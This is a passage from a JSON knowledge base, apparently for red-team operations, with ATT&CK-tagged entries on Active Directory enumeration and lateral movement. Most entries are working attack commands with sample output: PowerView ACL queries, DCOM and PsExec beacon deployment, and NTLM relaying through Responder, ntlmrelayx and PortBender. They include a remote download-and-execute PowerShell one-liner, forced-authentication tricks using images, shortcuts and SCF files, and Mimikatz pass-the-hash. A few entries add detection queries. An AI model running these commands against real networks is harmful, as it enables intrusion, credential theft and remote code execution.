        "stealthy": false,
        "changes": [
            "\n## [[PowerView]]\n### Get-ForestDomain\n\n```powershell\nGet-ForestDomain\n\nForest                  : evil.corp\nDomainControllers       : {dc-1.evil.corp}\nChildren                : {edu.evil.corp}\nDomainMode              : Unknown\nDomainModeLevel         : 7\nParent                  : \nPdcRoleOwner            : dc-1.evil.corp\nRidRoleOwner            : dc-1.evil.corp\nInfrastructureRoleOwner : dc-1.evil.corp\nName                    : evil.corp\n\nForest                  : evil.corp\nDomainControllers       : {dc-2.edu.evil.corp}\nChildren                : {}\nDomainMode              : Unknown\nDomainModeLevel         : 7\nParent                  : evil.corp\nPdcRoleOwner            : dc-2.edu.evil.corp\nRidRoleOwner            : dc-2.edu.evil.corp\nInfrastructureRoleOwner : dc-2.edu.evil.corp\nName                    : edu.evil.corp\n```"
        ],
        "tools": [
            "PowerView"
        ],
        "steps": []
    },
    {
        "id": "cb4a6e62-b8ab-46fe-b6a4-9ca88e83842a",
        "name": "Domain GPOs",
        "phase": "06. Domain Enumeration",
        "ttp": "T1615",
        "external": false,
        "description": "NoDescription",
        "content": "## Tools\n########\n########",
        "category": "Domain Objects",
        "stealthy": false,
        "changes": [
            "\n## [[ADReaper]]\nTo list GPOs from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command gpo\n```",
            "\n## [[PowerView]]\n[[Local Administrator Password Solution (LAPS)]]\n\n### Get GPOs filter with name\n\n```powershell\nGet-DomainGPO | ? { $_.DisplayName -like \"*laps*\" } | select DisplayName, Name, GPCFileSysPath | fl\n\ndisplayname    : LAPS\nname           : {4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\ngpcfilesyspath : \\\\edu.evil.corp\\SysVol\\edu.evil.corp\\Policies\\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\n```",
            "\n## [[PowerView]]\n### Resolve ObjectDN\n\nResolve Object Distinguised Name\n\n```powershell\nGet-DomainGPO -Name \"{AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}\" -Properties DisplayName\n\ndisplayname       \n-----------       \nPowerShell Logging\n```\n\n### Create new GPOs\n\nThis PowerView query will show the Security Identifiers (SIDs) of principals that can create new GPOs in the domain, which can be translated via [[PowerView#Convert SID]].\n\n```powershell\nGet-DomainObjectAcl -SearchBase \"CN=Policies,CN=System,DC=edu,DC=evil,DC=corp\" -ResolveGUIDs | ? { $_.ObjectAceType -eq \"Group-Policy-Container\" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl\n\nObjectDN              : CN=Policies,CN=System,DC=edu,DC=evil,DC=corp\nActiveDirectoryRights : CreateChild\nSecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125\n```\n\n### Link GPOs\n\n```powershell\nGet-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq \"GP-Link\" -and $_.ActiveDirectoryRights -match \"WriteProperty\" } | select ObjectDN, SecurityIdentifier | fl\n\nObjectDN           : OU=Workstations,DC=edu,DC=evil,DC=corp\nSecurityIdentifier : S-1-5-21-3263068140-2042698922-2891547269-1125\n\nObjectDN           : OU=Servers,DC=edu,DC=evil,DC=corp\nSecurityIdentifier : S-1-5-21-3263068140-2042698922-2891547269-1125\n\nObjectDN           : OU=Tier 1,OU=Servers,DC=edu,DC=evil,DC=corp\nSecurityIdentifier : S-1-5-21-3263068140-2042698922-2891547269-1125\n\nObjectDN           : OU=Tier 2,OU=Servers,DC=edu,DC=evil,DC=corp\nSecurityIdentifier : S-1-5-21-3263068140-2042698922-2891547269-1125\n```\n\n### WriteProperty, WriteDacl, WriteOwner\n\n#### Affecting GPOs\n\nThis query will return any GPO in the domain, where a 4-digit RID has **WriteProperty**, **WriteDacl** or **WriteOwner**. Filtering on a 4-digit RID is a quick way to eliminate the default 512, 519, etc results.\n\n```powershell\nGet-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match \"WriteProperty|WriteDacl|WriteOwner\" -and $_.SecurityIdentifier -match \"S-1-5-21-3263068140-2042698922-2891547269-[\\d]{4,10}\" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl\n\nObjectDN              : CN={AD7EE1ED-CDC8-4994-AE0F-50BA8B264829},CN=Policies,CN=System,DC=edu,DC=evil,DC=corp\nActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, GenericExecute\nSecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1126\n```\n\n[[PowerView#Convert SID]]\n\n#### Affecting user\n\nThis query will return any principal that has **GenericAll**, **WriteProperty** or **WriteDacl** on jonas.\n\n```powershell\nGet-DomainObjectAcl -Identity jonas | ? { $_.ActiveDirectoryRights -match \"GenericAll|WriteProperty|WriteDacl\" -and $_.SecurityIdentifier -match \"S-1-5-21-3263068140-2042698922-2891547269-[\\d]{4,10}\" } | select SecurityIdentifier, ActiveDirectoryRights | fl\n\nSecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125\nActiveDirectoryRights : GenericAll\n\nSecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125\nActiveDirectoryRights : GenericAll\n\nConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1125\nEDU\\1st Line Support\n```\n\n#### Affecting OU\n\n```powershell\nGet-DomainObjectAcl -SearchBase \"CN=Users,DC=edu,DC=evil,DC=corp\" | ? { $_.ActiveDirectoryRights -match \"GenericAll|WriteProperty|WriteDacl\" -and $_.SecurityIdentifier -match \"S-1-5-21-3263068140-2042698922-2891547269-[\\d]{4,10}\" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl\n\nObjectDN              : CN=Joyce Adam,CN=Users,DC=edu,DC=evil,DC=corp\nActiveDirectoryRights : GenericAll\nSecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125\n\nObjectDN              : CN=1st Line Support,CN=Users,DC=edu,DC=evil,DC=corp\nActiveDirectoryRights : GenericAll\nSecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125\n\nObjectDN              : CN=Developers,CN=Users,DC=edu,DC=evil,DC=corp\nActiveDirectoryRights : GenericAll\nSecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125\n\nObjectDN              : CN=Oracle Admins,CN=Users,DC=edu,DC=evil,DC=corp\nActiveDirectoryRights : GenericAll\nSecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125\n```"
        ],
        "tools": [
            "ADReaper",
            "PowerView"
        ],
        "steps": []
    },
    {
        "id": "1ef2d0f2-2762-4e8a-8b88-8f1cc4fc4fb6",
        "name": "Domain Groups",
        "phase": "06. Domain Enumeration",
        "ttp": "T1069.002",
        "external": false,
        "description": "NoDescription",
        "content": "# Domain Groups\n\n## Tools\n########\n########",
        "category": "Domain Objects",
        "stealthy": false,
        "changes": [
            "\n## [[ADReaper]]\nTo list all available Groups from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command groups\n```\n\nTo list all Groups with attributes from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command groups -filter full-data\n```\n\nTo list attributes of Specific Group from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command groups -name <group name>\n```\n\nTo list members of Specific Group from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command groups -name <group name> -filter membership\n```\n\nTo list users Never Logged On from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command never-loggedon\n```",
            "\n## [[PowerView]]\n### Get Groups containing users outside of this domain\n\n```powershell\nGet-DomainForeignGroupMember -Domain evil.external\n\nGroupDomain             : evil.external\nGroupName               : Administrators\nGroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=subsidiary,DC=external\nMemberDomain            : evil.external\nMemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133\nMemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=subsidiary,\n                          DC=external\n```\n\nGet the group of the machine\n\n```powershell\nGet-NetLocalGroupMember -ComputerName ad.evil.external\n\nComputerName : ad.evil.external\nGroupName    : Administrators\nMemberName   : EDU\\External Admins\nIsGroup      : True\nIsDomain     : True\n```\n\nGet the users within this group to see who can access this machine\n\n```powershell\nGet-DomainGroupMember -Identity \"External Admins\" | select MemberName\n\nMemberName\n----------\njonas\n```\n\n[[PowerView#Convert SID]]\n\n### Machines that have identity assigned to a target group\n\n```powershell\nGet-DomainGPOUserLocalGroupMapping -Identity \"Jump Users\" -LocalGroup \"Remote Desktop Users\" | select -expand ComputerName\n\nsql1.evil.corp\nexch-1.evil.corp\n```"
        ],
        "tools": [
            "ADReaper",
            "PowerView"
        ],
        "steps": []
    },
    {
        "id": "89dd2f45-1771-4acc-b07b-32d799919ad4",
        "name": "Domain Users",
        "phase": "06. Domain Enumeration",
        "ttp": "T1087.002",
        "external": false,
        "description": "NoDescription",
        "content": "# Domain User\n\n## Tools\n########\n########",
        "category": "Domain Objects",
        "stealthy": false,
        "changes": [
            "\n## [[ADReaper]]\nTo list all Users from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command users\n```\n\nTo list all Users with attributes from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command users -filter full-data\n```\n\nTo list attributes of Specific Users from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command users -name <user>\n```\n\nTo list the membership of the Specific User,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command users -name <user> -filter membership\n```",
            "\n## [[PowerView]]\n[[Sensitive Files]]\n\n### Show DomainObject\n\n```powershell\nGet-DomainUser -Identity jonas -Properties ServicePrincipalName\n\nserviceprincipalname\n--------------------\nfake/NOTHING\n```"
        ],
        "tools": [
            "ADReaper",
            "PowerView"
        ],
        "steps": []
    },
    {
        "id": "7f051fe7-6461-4459-b16f-416b924c125d",
        "name": "Domain",
        "phase": "06. Domain Enumeration",
        "ttp": "T1046",
        "external": false,
        "description": "NoDescription",
        "content": "# Domain\n\n# Tools\n########\n########",
        "category": "Domain Objects",
        "stealthy": false,
        "changes": [],
        "tools": [
            "ADReaper",
            "Chameleon",
            "Mimikatz",
            "Net",
            "NMAP",
            "nmcli",
            "Nslookup",
            "PowerView",
            "SharpHound",
            "SharpView",
            "sublist3r",
            "theHarvester",
            "wmic"
        ],
        "steps": []
    },
    {
        "id": "16097d41-d915-4e0a-aa53-d49b24f66995",
        "name": "DCOM",
        "phase": "07. Lateral Movement",
        "ttp": "T1021.003",
        "external": false,
        "description": "DCOM is an extension of COM (Component Object Model), which allows applications to instantiate and access the properties and methods of COM objects on a remote computer just like objects on the local machine using the DCERPC-based DCOM protocol. Information about the identity, the implementation and the configuration of every COM (and DCOM) object is stored in the registry, and associated with a few important identifiers:\n- CLSID - The Class Identifier is a GUID, which acts as a unique identifier for a COM class, and every class registered in Windows is associated with a CLSID (COM objects may be used without registration, but that is beyond the scope of this article). The CLSID key in the registry points to the implementation of the class, using the InProcServer32 subkey in case of a dll-based object, and the LocalServer32 key in case of an exe.\n- ProgID - The Programmatic Identifier is an optional identifier, which can be used as a more user-friendly alternative to a CLSID, as it does not have to adhere to the intimidating GUID format of CLSIDs (\"System.AppDomainManager\", for example, is much easier on the eyes than a GUID). ProgIDs are not guaranteed to be unique, and unlike CLSID, not every class is associated with a ProgID.\n- AppID  - The Application Identifier is used to specify the configuration of one or more COM objects associated with the same executable. This includes the permissions given to various groups to instantiate and access the associated classes, both locally and remotely.\n\nThe instantiation of a remote DCOM object behaves as follows:\n1. The client machine requests an instantiation of an object denoted by a CLSID from a remote machine. If the client uses a ProgID, it is first resolved locally to a CLSID.\n2. The remote machine checks if there is an AppID associated with the CLSID in question, and verifies the permissions of the client.\n3. If all goes well, the DCOMLaunch service creates an instance of the requested class, most commonly by running the executable of the LocalServer32 subkey, or by creating a DllHost process to host a dll referenced by the InProcServer32 subkey.\n4. Communication is established between the client application and the server process. In most cases, the new process is created in the session associated with the DCOM communication.\n5. The client can then access the members and methods of the newly created object.",
        "content": "# DCOM\n\n## Cobalt Strike\n-\n\n# Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[Invoke-DCOM]]\n'''\nImport-Module .\\Invoke-DCOM.ps1\nInvoke-DCOM -ComputerName '192.168.2.100' -Method MMC20.Application -Command \"calc.exe\"\nInvoke-DCOM -ComputerName '192.168.2.100' -Method ExcelDDE -Command \"calc.exe\"\nInvoke-DCOM -ComputerName '192.168.2.100' -Method ServiceStart \"MyService\"\n'''\n\nTo interact over Distributed Component Object Model (DCOM), we must use an external tool such as [[Invoke-DCOM]].\n''''''beacon\nbeacon> powershell-import C:\\Tools\\Invoke-DCOM.ps1\nbeacon> powershell Invoke-DCOM -ComputerName srv1 -Method MMC20.Application -Command C:\\Windows\\beacon-smb.exe\nCompleted\n\nbeacon> link srv1\n[+] established link to child beacon: 10.10.1.20\n''''''\n\nDCOM is more complicated to detect, since each \"Method\" works in a different way. In the particular case of 'MMC20.Application', the spawned process will be a child of 'mmc.exe'.\n\n''''''\nProcessId: 952\nImage: C:\\Windows\\beacon-smb.exe\nParentImage: C:\\Windows\\System32\\mmc.exe\n''''''  \nProcesses started via DCOM may also be seen where the parent is 'svchost.exe' (started with the command line '-k DcomLaunch')."
        ],
        "tools": [
            "Invoke-DCOM"
        ],
        "references": [
            "https://www.cybereason.com/blog/dcom-lateral-movement-techniques",
            "https://www.winccoa.com/documentation/WinCCOA/3.18/en_US/Treiber_OPC/opc_c_dcom.html"
        ],
        "steps": [
            {
                "id": "5a71f508-42a9-403a-9dbc-250a1a866b00",
                "name": "Get RCE via DCOM",
                "description": "",
                "requirements": {
                    "and": [
                        {
                            "tag": "SERVICE:DCOM"
                        },
                        {
                            "tag": "SERVICE:RPC"
                        },
                        {
                            "tag": "PRIVS:ADMIN"
                        }
                    ]
                },
                "results": [
                    "EXECUTION:REMOTE"
                ]
            }
        ]
    },
    {
        "id": "4c850e26-3460-4906-8e6f-612240140274",
        "name": "PowerShell Remoting",
        "phase": "07. Lateral Movement",
        "ttp": "T1021.006",
        "external": false,
        "description": "NoDescription",
        "content": "# PowerShell Remoting\n\n## Detection\nThere are multiple steps to this technique that can be used to detect.  We can look for **egress** network connections with a destination port of **5985**.\n\n>event.module : sysmon and event.type : connection and network.direction : egress and destination.port : 5985\n\nThere's the process start event for `wsmprovhost.exe` (with an `-Embedding` parameter in the command line arguments).\n\n>event.module : sysmon and event.type : process_start and process.command_line : \"C:\\\\Windows\\\\system32\\\\wsmprovhost.exe -Embedding\"\n\nPowerShell logging will also provide the script block and/or transactional log, which reveals which code/commands were executed. Use the `process.pid` field from the previous query to find its associated script block.\n\n>event.module : powershell and winlog.process.pid: 2984\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "3ccc90c1-567c-4a22-a2f7-127a2ca5873e",
        "name": "PsExec",
        "phase": "07. Lateral Movement",
        "ttp": "T1021.006",
        "external": false,
        "description": "",
        "content": "1. Upload a service binary to the ADMIN$ share via SMB\n2. Create a service on the remote machine with the binpath pointing to the payload\n3. Start the service\n4. When done, clean up by stopping the service and deleting the binary\n\n```cmd\ncopy sv_beacon.exe \\srv1\\ADMIN$\nsc \\srv1 create mal_service binPath='C:\\Windows\\sv_beacon.exe'\ndel \\srv1\\ADMIN$\\sv_beacon.exe\n```\n## Detection\nTo build a detection, the following markers can be used:\n-   File creation.\n-   Service installed.\n-   Process start.\n\nCobalt Strike has a few default behaviours that we can profile:\n-   It uses the same name for the service and the exe.\n-   The name is a random alphanumeric string of length 7.\n-   The service binary is always dropped into `C:\\Windows`.\n\nFurthermore, `psexec` and `psexec64` are the only `jump` methods that will perform a process migration automatically (by default into `rundll32.exe`) in order to delete the binary. It's parent process will be the service binary and would result in a further process create event.\nWith psexec/64, the service filename is always a UNC path (e.g. `\\\\srv1\\ADMIN$\\fe80480.exe`). \n\n`psexec_psh` will execute PowerShell via `%COMSPEC%` (resulting in the command line interpreter, usually `cmd.exe`).\nIf psexec_psh is used, the filepath will be `%COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand ba`.\n\n>event.module : sysmon and event.type : creation and event.category : file and file.extension : exe and file.directory : 'C:\\\\Windows'\n\nFind the associated service.\n\n>event.provider : 'Service Control Manager' and message : 'A service was installed'\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "3cff90c1-567c-4a22-a2f7-127a2ca5873e",
        "name": "SMB Remote Exec",
        "phase": "07. Lateral Movement",
        "ttp": "T1021.006",
        "external": false,
        "description": "",
        "content": "Use SMB to gain access to another workstation",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "c33f8338-e69c-4ce4-a432-d482686bea32",
        "name": "SMB Relay",
        "phase": "07. Lateral Movement",
        "ttp": "T1557.001",
        "external": false,
        "description": "Relay smb connections to gain access to another workstation",
        "content": "# SMB Relay\n\n## Idea\n1. Attacker selects target\n2. Victim authenticates to attacker\n3. Attacker forwards the authentication attempt to the target\n4. Attacker receives the challenge\n5. Attacker sends back challenge to the victim\n6. Victim sents encrypted challenge to attacker\n7. Attacker sends the challenge and authenticates\n\nNote: this works only if the \u201cNetwork security: LAN Manager authentication level\u201d is set to \u201cSend LM & NTLM responses\u201d or perhaps \u201cNTLMv2 response only\n\n1. Run [[Tools/Responder.md]] to poison LLMNR / SMB / ARP requests\n2. Run [[Tools/smbrelayx.md]] to relay the ticket and drop tools / execute commands on the target server\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "c7a1afd1-c3a6-4771-bf44-9557775c34cf",
        "name": "WMI",
        "phase": "07. Lateral Movement",
        "ttp": "T1047",
        "external": false,
        "description": "Get Persistence via Teams DLL hijacking",
        "content": "# PowerShell Remoting\n\n## Detection\nWhen binaries are executed via WMI (using process call create), it will be a child of `WmiPrvSE.exe`. So a process create event where **WmiPrvSE** is the parent will be suspicious. This would also be the case if you use WMI to execute a PowerShell one-liner.\n\n>event.module: sysmon and event.type : process_start and process.parent.name : WmiPrvSE.exe\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "7560eb03-f96c-4589-ba9c-914161082d8e",
        "name": "Browser",
        "phase": "07. Lateral Movement",
        "ttp": "T1572",
        "external": false,
        "description": "User RDP in order to lateral move to other systems",
        "content": "Firefox plus the FoxyProxy extension or Proxychains, Proxifier is ideal for pivoting a browser into the network, to view internal web applications.",
        "category": "Pivoting",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "b9f95335-e93c-49a3-ad68-463bb48ae1c3",
        "name": "NTLM Relaying",
        "phase": "07. Lateral Movement",
        "ttp": "T1557.001",
        "external": false,
        "description": "NoDescription",
        "content": "# NTLM Relaying\nNTLM authentication uses a 3-way handshake between a client and server. The high-level steps are as follows:\n1.  The client makes an authentication request to a server for a resource it wants to access.\n2.  The server sends a challenge to the client, whereas the challenge is using the hash of the users password.\n3.  The client sends the encrypted response to the server, which contacts a domain controller to verify the encrypted challenge is correct.\n\nIn an NTLM relay attack, an attacker is able to intercept or capture this authentication traffic and effectively allows them to impersonate the client against the same, or another service.\n\nAn example:  \nA client attempts to connect to an SQL server, but the attacker monitors the authentication mechanism and impersonates/replays the handshake, to connect to the CIFS service as he was the client.\n\nIn case a linux host is available tools like\n* [[Responder]]\n* [[ntlmrelayx]]\n\ncan be used.\n\nBut on Windows port 445 is always in use so the SMB port needs to be bended by [[PortBender]] which will be reflective injected.\n\n\u26a0\ufe0fThis pretty much breaks any SMB service on the machine.\n\n#opsec: The loaded driver will be located in the current working directory of the Beacon so choose `C:\\Windows\\System32\\drivers` before you run.  \n\n\n## Force Authentication\nIf you don't have the possibilities to fetch a request try some force authentication methods as shown below.\n\n### 1x1 Images in Emails\nSend emails with an invisible 1x1 image embedded in the mail. When being viewed the email client will attempt to download the image over the UNC path and trigger an NTLM authentication attempt.\n`<img src=\"\\\\10.10.10.21\\test.ico\" height=\"1\" width=\"1\" />`\n\n### Windows Shortcuts\nThe icon property of the Windows shortcut (.lnk) can can be used by pointing it to an UNC path which will trigger an NTLM authentication attempt just by being viewed.\n\nThe easiest way to create a shortcut is with PowerShell.\n``````powershell\n$wsh = new-object -ComObject wscript.shell\n$shortcut = $wsh.CreateShortcut(\"\\\\dc1\\share\\test.lnk\")\n$shortcut.IconLocation = \"\\\\10.10.10.21\\test.ico\"\n$shortcut.Save()\n``````\n\n### SCF file\nSCF (Shell Command Files) files can be used to access a specific UNC path. Paste the code below into a text file and store it on a network share.\n``````@log.scf\n[Shell]\nCommand=``2\nIconFile=\\\\X.X.X.X\\share\\test.ico\n[Taskbar]\nCommand=ToggleDesktop\n``````\n\n## Tools\n########\n########",
        "category": "Pivoting",
        "stealthy": false,
        "changes": [
            "\n## [[InveighZero]]\nCapture NetNTLM hash\nThis should be run as a local admin.\n\n\u2139 InveighZero will ignore traffic coming from accounts that are generally deemed to be \"uncrackable\" such as computer accounts.\n```beacon\nbeacon> execute-assembly C:\\Tools\\InveighZero\\Inveigh\\bin\\Debug\\Inveigh.exe -DNS N -LLMNR N -LLMNRv6 N -HTTP N -FileOutput N\n\n[*] Inveigh 0.913 started at 2022-03-10T18:02:36\n[+] Elevated Privilege Mode = Enabled\n[+] Primary IP Address = 10.10.17.231\n[+] Spoofer IP Address = 10.10.17.231\n[+] Packet Sniffer = Enabled\n[+] DHCPv6 Spoofer = Disabled\n[+] DNS Spoofer = Disabled\n[+] LLMNR Spoofer = Disabled\n[+] LLMNRv6 Spoofer = Disabled\n[+] mDNS Spoofer = Disabled\n[+] NBNS Spoofer = Disabled\n[+] HTTP Capture = Disabled\n[+] Proxy Capture = Disabled\n[+] WPAD Authentication = NTLM\n[+] WPAD NTLM Authentication Ignore List = Firefox\n[+] SMB Capture = Enabled\n[+] Machine Account Capture = Disabled\n[+] File Output = Disabled\n[+] Log Output = Enabled\n[+] Pcap Output = Disabled\n[+] Previous Session Files = Not Found\n[*] Press ESC to access console\n```",
            "\n## [[MultiRelay]]\n[[NTLM Relaying to ADCS]]",
            "\n## [[ntlmrelayx]]\nRun ntlmrelayx or responder.\nBy default (not provided -c) it will do `secretsdump` to dump the local SAM hashes\n``````sh\nproxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://10.10.17.68 -smb2support --no-http-server --no-wcf-server\n\n# alternatively provide a command with:\n-c\n'powershell -nop -w hidden -c \"iex (new-object net.webclient).downloadstring(\\\"http://10.10.17.231:8080/b\\\")\"'\n``````",
            "\n## [[PortBender]]\n1. Upload WinDiver64.sys driver to `C:\\Windows\\system32\\drivers`\n2. Redirecting SMB to 8445\n3. Create a pfwd to relay 8845 to the C2 server with [[ntlmrelayx]] running\n4. Start a socks4 on 1080 so SMB can go through\n5. NTLM relay the smb connection to dump local SAM hashes\n6. Use via [[Pass-the-Hash]] or crack via [[Hashcat]]\n\nLoad `PortBender.cna`\n``````beacon\nbeacon> getuid\n[*] You are NT AUTHORITY\\SYSTEM (admin)\n\nbeacon> pwd\n[*] Current directory is C:\\Windows\\system32\\drivers\n\nbeacon> upload C:\\Tools\\PortBender\\WinDivert64.sys\nbeacon> PortBender redirect 445 8445\nbeacon> rportfwd 8445 127.0.0.1 445\n[+] started reverse port forward on 8445 to 127.0.0.1:445\n\nbeacon> socks 1080\n[+] started SOCKS4a server on: 1080\n\nproxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://10.10.17.68 -smb2support --no-http-server --no-wcf-server\n``````\n\nLocal NTLM hashes could then be cracked or used with [[Pass-the-Hash]].\n``````beacon\nbeacon> mimikatz sekurlsa::pth /user:Administrator /domain:edu.evil.corp /ntlm:b423cdd3ad21718de4490d9344afef72\nbeacon> steal_token 21244\nbeacon> jump psexec64 srv2 smb\n[*] Tasked beacon to run windows/beacon_bind_pipe (\\\\.\\pipe\\msagent_a3) on srv2 via Service Control Manager (\\\\srv2\\ADMIN$\\1985e43.exe)\nStarted service 3695e43 on srv2\n[+] established link to child beacon: 10.10.17.68\n``````",
            "\n## [[Responder]]\n1.  Check if SMB signing with sub-tool RunFinger.py  \n    `python ./Responder/tools/RunFinger.py -i <target IP>`\n    \n2.  Set the following values in Responder.conf  \n    ```bash\n    SMB = Off\n    HTTP = Off\n    ```\n    \n3.  Start the Responder and answer to all LLMNR requests + --lm (add downgrade attack)  \n    `python ./Responder/Responder.py -I eth0 --lm`\n    \n4.  In parallel start [[Tools/MultiRelay]] | [[Tools/smbrelayx]] to use found credentials to gain access/info  \n    `python ./Responder/tools/MultiRelay.py -t <target IP> -u ALL`",
            "\n## [[smbrelayx]]\n1. Install\n    ```bash\n    pip3 install impacket\n    git clone https://github.com/SecureAuthCorp/impacket\n    ```\n2. Drop and execute beacon on device\n    ```bash\n    cd impacket\n    sudo python3 examples/smbrelayx.py -h 192.168.1.118 -e ~/smbexp.exe\n    ```"
        ],
        "tools": [
            "InveighZero",
            "MultiRelay",
            "ntlmrelayx",
            "PortBender",
            "PrintSpooler",
            "Responder",
            "SharpSystemTriggers",
            "smbrelayx"
        ],
        "steps": []
    },
    {
        "id": "69894386-19d7-4707-a914-42e82ae6f95d",
        "name": "RDP",
        "phase": "07. Lateral Movement",
        "ttp": "T1021.001",
        "external": false,
        "description": "User RDP in order to lateral move to other systems",
        "content": "## Tools\n########\n########",
        "category": "Pivoting",
        "stealthy": false,
        "changes": [
            "\n## [[FreeRDP]]\n```bash\nxfreerdp /u:user /p:yGWrFM9jn37K /v:pc.testdomain.local\n```\n\n# Resources\n[https://github.com/awakecoding/FreeRDP-Manuals/blob/master/User/FreeRDP-User-Manual.markdown](https://github.com/awakecoding/FreeRDP-Manuals/blob/master/User/Free[[NMAP]]",
            "\n## [[PowerShell]]\n`Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-TerminalServices-RDPClient/Operational'; id='1024' } | select timecreated, message | ft -AutoSize -Wrap`",
            "\n## [[RDPThief]]\n* https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/\n* https://github.com/passthehashbrowns/SharpRDPThief"
        ],
        "tools": [
            "FreeRDP",
            "PowerShell",
            "RDPThief"
        ],
        "steps": []
    },
    {
        "id": "f62214e8-fdd0-46dc-b5cb-1fe0e14c8d37",
        "name": "Reverse Port Forward",
        "phase": "07. Lateral Movement",
        "ttp": "T1572",
        "external": false,
        "description": "NoDescription",
        "content": "# Reverse Port Forward\nReverse Port Forwarding allows a machine to redirect incomming traffic to a specified IP and port.\n\n## Windows\nThere are two main ways to create a reverse port forward:\n1.  Windows `netsh`.\n2.  Reverse port forward capability built into the C2 framework.\n\n## Cobalt Strike\nHas two functions which do the job:\n- rportfwd\n- rportfwd_local\n\n\n## Tools\n########\n########",
        "category": "Pivoting",
        "stealthy": false,
        "changes": [
            "\n## [[netsh]]\nMachines:\n\n| Nr | System | Task |\n| -- | ------ | ---- |\n| 1  | _dc1.edu.evil.corp_ | Proxy Server |\n| 2  | _ad.evil2.corp_ | Target |\n| 3  | _dc1.evil.corp_ | Start |\n\n1. Create proxy on 1 to forward to 2 port 4444\n`netsh interface portproxy` allows to view and configure a proxy for both IPv4 and IPv6 traffic between networks.\n>netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp\n\nWhere:\n-   **listenaddress** is the IP address to listen on (probably always 0.0.0.0).\n-   **listenport** is the port to listen on.\n-   **connectaddress** is the destination IP address.\n-   **connectport** is the destination port.\n-   **protocol** to use (always TCP).\n\n>netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.14.55 connectport=4444 protocol=tcp\n\n2. Verify its there with `netsh interface portproxy show`. \n```cmd\nC:\\>netsh interface portproxy show v4tov4\nListen on ipv4:             Connect to ipv4:\nAddress         Port        Address         Port\n--------------- ----------  --------------- ----------\n0.0.0.0         4444        10.10.14.55    4444\n```\n\n3. Connect from 3 zu 1 and you will see the connection being made in the PowerShell script.\n\nTest if the proxy works on 2:\n``````powershell\n$endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Any, 4444)\n$listener = New-Object System.Net.Sockets.TcpListener $endpoint\n$listener.Start()\nWrite-Host \"Listening on port 4444\"\nwhile ($true)\n{\n  $client = $listener.AcceptTcpClient()\n  Write-Host \"A client has connected\"\n  $client.Close()\n}\n``````\n\nInitiate connection from 3.\n``````powershell\nPS C:\\> Test-NetConnection -ComputerName 10.10.1.8 -Port 4444\n\nComputerName     : 10.10.1.8\nRemoteAddress    : 10.10.1.8\nRemotePort       : 4444\nInterfaceAlias   : Ethernet\nSourceAddress    : 10.10.2.78\nTcpTestSucceeded : True\n``````\n\n4. To remove the portproxy:\n>C:\\>netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444\n\nAspects to note about netsh port forwards:\n- You need to be a local administrator to add and remove them, regardless of the bind port.\n- They're socket-to-socket connections, so they can't be made through network devices such as firewalls and web proxies.\n- They're particularly good for creating relays between machines."
        ],
        "tools": [
            "netsh"
        ],
        "steps": []
    },
    {
        "id": "54a18071-811d-4f08-8e43-07f3cca11a93",
        "name": "SOCKS Proxy",
        "phase": "07. Lateral Movement",
        "ttp": "T1572",
        "external": false,
        "description": "NoDescription",
